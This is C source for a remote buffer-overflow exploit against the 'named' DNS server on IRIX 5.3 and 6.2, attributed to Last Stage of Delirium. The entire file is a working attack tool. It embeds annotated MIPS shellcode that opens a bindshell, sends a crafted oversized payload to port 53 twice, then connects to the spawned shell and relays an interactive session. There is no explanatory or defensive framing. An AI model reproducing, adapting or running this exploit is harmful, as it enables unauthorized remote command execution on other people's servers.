/*## copyright LAST STAGE OF DELIRIUM may 1998 poland        *://lsd-pl.net/ #*/
/*## named                                                                   #*/

/*   usage ./r target bindshell_port                                          */
/*   this exploit version executes the bindshell on the target                */
/*   machine waiting for the connection on a bindshell_port                   */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>

#define START_ADR       0x10040100      

#define PUTADR(p,adr) {*p=(adr>>24)&0xff;*(p+1)=(adr>>16)&0xff;*(p+2)=(adr>>8)&0xff;*(p+3)=adr&0xff;}

#define PUTADRL(p,adr) {*p=(adr>>8)&0xff;*(p+1)=adr&0xff;}

char tablica[25]={
    0x00,0x00,0x34,0x34,0x09,0x80,0x00,0x00,
    0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x01,0x20,0x20,0x20,0x20,0x00,
    0x00
};

char bindshell[]={
    "\x04\x10\xff\xff"       /* bltzal  $zero,<bindshell>    */
    "\x02\x20\x90\x24"       /* and     $s2,$s1,$zero        */
    "\x03\xe0\x88\x25"       /* move    $s1,$ra              */
    "\x22\x31\x02\x04"       /* addi    $s1,$s1,516          */
    "\x24\x04\x0f\xff"       /* li      $a0,4095             */
    "\x38\x84\x0f\xfd"       /* xori    $a0,$a0,0xffd        */
    "\x24\x05\x0f\xff"       /* li      $a1,4095             */
    "\x38\xa5\x0f\xfd"       /* xori    $a1,$a1,0xffd        */
    "\x02\x40\x30\x25"       /* move    $a2,$s2              */
    "\x24\x02\x04\x53"       /* li      $v0,1107             */
    "\x02\x04\x84\x0c"       /* syscall                      */
    "\x01\x08\x40\x25"       /* or      $t0,$t0,$t0          */
    "\xae\x22\xff\xcc"       /* sw      $v0,-52($s1)         */
    "\x8e\x33\xff\xcc"       /* lw      $s3,-52($s1)         */
    "\x02\x60\x20\x25"       /* move    $a0,$s3              */
    "\x02\x20\x28\x25"       /* move    $a1,$s1              */
    "\x20\xa5\xff\xd0"       /* addi    $a1,$a1,-48          */
    "\x24\x06\x0f\xff"       /* li      $a2,4095             */
    "\x38\xc6\x0f\xef"       /* xori    $a2,$a2,0xfef        */
    "\x3c\x07\x0f\xff"       /* lui     $a3,0xfff            */
    "\x38\xe7\x66\x66"       /* xori    $a3,$a3,0x6666       */
    "\x3c\x08\x0f\xfd"       /* lui     $t0,0xffd            */
    "\x01\x07\x40\x26"       /* xor     $t0,$t0,$a3          */
    "\xae\x28\xff\xd0"       /* sw      $t0,-48($s1)         */
    "\xae\x32\xff\xd4"       /* sw      $s2,-44($s1)         */
    "\xae\x32\xff\xd8"       /* sw      $s2,-40($s1)         */
    "\xae\x32\xff\xdc"       /* sw      $s2,-36($s1)         */
    "\x24\x02\x04\x42"       /* li      $v0,1090             */
    "\x02\x04\x84\x0c"       /* syscall                      */
    "\x01\x08\x40\x25"       /* or      $t0,$t0,$t0          */
    "\x02\x60\x20\x25"       /* move    $a0,$s3              */
    "\x24\x05\x0f\xff"       /* li      $a1,4095             */
    "\x38\xa5\x0f\xfa"       /* xori    $a1,$a1,0xffa        */
    "\x24\x02\x04\x48"       /* li      $v0,1096             */
    "\x02\x04\x84\x0c"       /* syscall                      */
    "\x01\x08\x40\x25"       /* or      $t0,$t0,$t0          */
    "\x02\x60\x20\x25"       /* move    $a0,$s3              */
    "\x02\x20\x28\x25"       /* move    $a1,$s1              */
    "\x20\xa5\xff\xd0"       /* addi    $a1,$a1,-48          */
    "\x24\x08\x0f\xff"       /* li      $t0,4095             */
    "\x39\x08\x0f\xef"       /* xori    $t0,$t0,0xfef        */
    "\xae\x28\xff\xcc"       /* sw      $t0,-52($s1)         */
    "\x02\x20\x30\x25"       /* move    $a2,$s1              */
    "\x20\xc6\xff\xcc"       /* addi    $a2,$a2,-52          */
    "\x24\x02\x04\x41"       /* li      $v0,1089             */
    "\x02\x04\x84\x0c"       /* syscall                      */
    "\x01\x08\x40\x25"       /* or      $t0,$t0,$t0          */
    "\xae\x22\xff\xcc"       /* sw      $v0,-52($s1)         */
    "\x8e\x33\xff\xcc"       /* lw      $s3,-52($s1)         */
    "\x02\x40\x20\x25"       /* move    $a0,$s2              */
    "\x24\x02\x03\xee"       /* li      $v0,1006             */
    "\x02\x04\x84\x0c"       /* syscall                      */
    "\x01\x08\x40\x25"       /* or      $t0,$t0,$t0          */
    "\x24\x04\x0f\xff"       /* li      $a0,4095             */
    "\x38\x84\x0f\xfe"       /* xori    $a0,$a0,0xffe        */
    "\x24\x02\x03\xee"       /* li      $v0,1006             */
    "\x02\x04\x84\x0c"       /* syscall                      */
    "\x01\x08\x40\x25"       /* or      $t0,$t0,$t0          */
    "\x24\x04\x0f\xff"       /* li      $a0,4095             */
    "\x38\x84\x0f\xfd"       /* xori    $a0,$a0,0xffd        */
    "\x24\x02\x03\xee"       /* li      $v0,1006             */
    "\x02\x04\x84\x0c"       /* syscall                      */
    "\x01\x08\x40\x25"       /* or      $t0,$t0,$t0          */
    "\x02\x60\x20\x25"       /* move    $a0,$s3              */
    "\x24\x02\x04\x11"       /* li      $v0,1041             */
    "\x02\x04\x84\x0c"       /* syscall                      */
    "\x01\x08\x40\x25"       /* or      $t0,$t0,$t0          */
    "\x02\x60\x20\x25"       /* move    $a0,$s3              */
    "\x24\x02\x04\x11"       /* li      $v0,1041             */
    "\x02\x04\x84\x0c"       /* syscall                      */
    "\x01\x08\x40\x25"       /* or      $t0,$t0,$t0          */
    "\x02\x60\x20\x25"       /* move    $a0,$s3              */
    "\x24\x02\x04\x11"       /* li      $v0,1041             */
    "\x02\x04\x84\x0c"       /* syscall                      */
    "\x01\x08\x40\x25"       /* or      $t0,$t0,$t0          */
    "\x3c\x07\xff\xff"       /* lui     $a3,0xffff           */
    "\x38\xe7\xff\xff"       /* xori    $a3,$a3,0xffff       */
    "\x3c\x08\xd0\x9d"       /* lui     $t0,0xd09d           */
    "\x35\x08\x96\x91"       /* ori     $t0,$t0,0x9691       */
    "\x01\x07\x40\x26"       /* xor     $t0,$t0,$a3          */
    "\xae\x28\xff\xe0"       /* sw      $t0,-32($s1)         */
    "\x3c\x08\xd0\x8c"       /* lui     $t0,0xd08c           */
    "\x35\x08\x97\xff"       /* ori     $t0,$t0,0x97ff       */
    "\x01\x07\x40\x26"       /* xor     $t0,$t0,$a3          */
    "\xae\x28\xff\xe4"       /* sw      $t0,-28($s1)         */
    "\x02\x20\x20\x25"       /* move    $a0,$s1              */
    "\x20\x84\xff\xe0"       /* addi    $a0,$a0,-32          */
    "\x02\x20\x28\x25"       /* move    $a1,$s1              */
    "\x20\xa5\xff\xe8"       /* addi    $a1,$a1,-24          */
    "\xae\x24\xff\xe8"       /* sw      $a0,-24($s1)         */
    "\xae\x32\xff\xec"       /* sw      $s2,-20($s1)         */
    "\x24\x02\x03\xf3"       /* li      $v0,1011             */
    "\x02\x04\x84\x0c"       /* syscall                      */
    "\x01\x08\x40\x25"       /* or      $t0,$t0,$t0          */
};

main(int argc,char **argv){
    int sck,i,srvsck;
    fd_set readfs;
    struct sockaddr_in address;
    struct sockaddr_in local;
    struct hostent *hp;
    int size,port;
    unsigned long lregt9,lreggp,lstart,lbcop7,ltmp;
    char regt9[4],reggp[4],start[4],bcop7[4];   
    char *b,*p;
    
    printf("copyright LAST STAGE OF DELIRIUM may 1998 poland  //lsd-pl.net/\n");
    printf("named for irix 5.3 6.2 IP:??\n\n");

    if(argc!=3){
        printf("usage: %s target port\n",argv[0]);exit(1);
    }
    port=atoi(argv[2]);

    lbcop7=lregt9=START_ADR;
    lstart=START_ADR+0x14;      
    lreggp=START_ADR+0x8024;    
    PUTADR(regt9,lregt9);
    PUTADR(reggp,lreggp);
    PUTADR(start,lstart);
    PUTADR(bcop7,lbcop7);
    PUTADRL(&bindshell[82],port);

    size=930;
    tablica[0]=(size+23)>>8;
    tablica[1]=(size+23)&0xff;
    tablica[23]=size>>8;
    tablica[24]=size&0xff;

    if((b=(char*)malloc(10500))==NULL) return(-1);
    memset(b,0,10500);
    bcopy(tablica,b,sizeof(tablica));

    for(i=0;i<sizeof(bindshell);i++)
      b[2+32+i]=bindshell[i];
    for(i=0;i<4;i++){
      b[2+200+420+i]=start[i];
      b[2+200+420+420+i]=regt9[i];
      b[1018+i]=reggp[i];
      b[930+i]=bcop7[i];
      b[1018-(7*8+4)+i]=regt9[i];
    }
    b[968]=0x20;
    b[528]=0x08;

    sck=socket(AF_INET,SOCK_STREAM,0);

    bzero(&address,sizeof(address));
    address.sin_family=AF_INET;
    address.sin_port=htons(53);
    if((address.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL){
            printf("error: address.\n");exit(-1);
        }
        memcpy(&address.sin_addr.s_addr,hp->h_addr,4);
    }

    if(connect(sck,(struct sockaddr *)&address,sizeof(address))<0){
        perror("error");exit(-1);
    }
    fflush(stdout);

    write(sck,b,25+size);
    close(sck);

    size=10000;
    b[0]=(size+23)>>8;
    b[1]=(size+23)&0xff;
    b[23]=size>>8;
    b[24]=size&0xff;

    sck=socket(AF_INET,SOCK_STREAM,0);
    sleep(1);
    if(connect(sck,(struct sockaddr *)&address,sizeof(address))<0){
        perror("error");exit(-1);
    }
    fflush(stdout);
    write(sck,b,25+size);
    close(sck);

    srvsck=socket(AF_INET,SOCK_STREAM,0);
    address.sin_port=htons(port);
    sleep(1);

    if(connect(srvsck,(struct sockaddr *)&address,sizeof(address))<0){
        perror("error");exit(-1);
    }

    printf("%s successfully exploited\n",argv[1]); 
    fflush(stdout);
    while(1){
        FD_ZERO(&readfs);
        FD_SET(0,&readfs);
        FD_SET(srvsck,&readfs);   
        if(select(FD_SETSIZE,&readfs,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&readfs)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue; 
                    else {printf("koniec.\n");exit(-1);}
                }
                write(srvsck,buf,cnt);
            }
            if(FD_ISSET(srvsck,&readfs)){
                if((cnt=read(srvsck,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue; 
                    else {printf("koniec.\n");exit(-1);}
                }
                write(1,buf,cnt);
            }
        }
    }
   free(b);
   close(srvsck);
}

